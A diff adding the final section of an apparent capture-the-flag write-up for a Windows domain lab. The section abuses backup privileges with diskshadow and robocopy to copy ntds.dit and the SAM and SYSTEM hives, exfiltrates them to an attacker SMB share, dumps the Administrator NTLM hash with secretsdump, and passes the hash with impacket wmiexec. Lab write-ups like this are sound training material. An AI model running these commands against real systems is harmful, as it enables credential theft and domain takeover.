@@ -153,4 +153,58 @@ and I found the second flag!!!
 
 ![](attachments/Pasted%20image%2020251223214643.png)
 
+See the privileges of `jmurphy`:
+
+![](attachments/Pasted%20image%2020251223223207.png)
+
+We see that they have `SeBackupPrivilege` and `SeRestorePrivilege` so we can dump the `ntds.dit`, the `sam`, and the system hashes.
+
+In Kali machine, I create a file called `viper.dsh` and I write this inside it:
+```
+set context persistent nowriters
+add volume c: alias viper
+create
+expose %viper% x:
+```
+
+then I am making it compatible with Windows by writing on the shell:
+```bash
+unix2dos viper.dsh
+```
+
+Then on the Kali machine I open up a SMB Server and transfer it over to the Windows machine.
+
+Then I write this commands one by one:
+```powershell
+diskshadow /s viper.dsh
+robocopy /b x:\windows\ntds . ntds.dit
+reg save hklm\system c:\windows\temp\system
+reg save hklm\sam c:\windows\temp\sam
+```
+
+and then I just transfer the copies of the `ntds.dit`, the `sam`, and the system over to my Kali machine:
+
+```powershell
+copy system, sam, ntds.dit \\192.168.148.21\share
+```
+
+Then I do `secretsdump` locally and I get the NTLM hash of the DC Administrator:
+
+![](attachments/Pasted%20image%2020251223223750.png)
+
+Then I try to connect with the hash firstly with `psexec`:
+
+```bash
+rlwrap impacket-psexec fusion.corp/Administrator@$target -hashes :9653b02d945329c7270525c4c2a69c67
+```
+
+but it didn't work so I used `winexec`:
+
+```bash
+rlwrap impacket-wmiexec fusion.corp/Administrator@$target -hashes :9653b02d945329c7270525c4c2a69c67
+```
+
+and I got the last flag:
+
+![](attachments/Pasted%20image%2020251223224015.png)
 
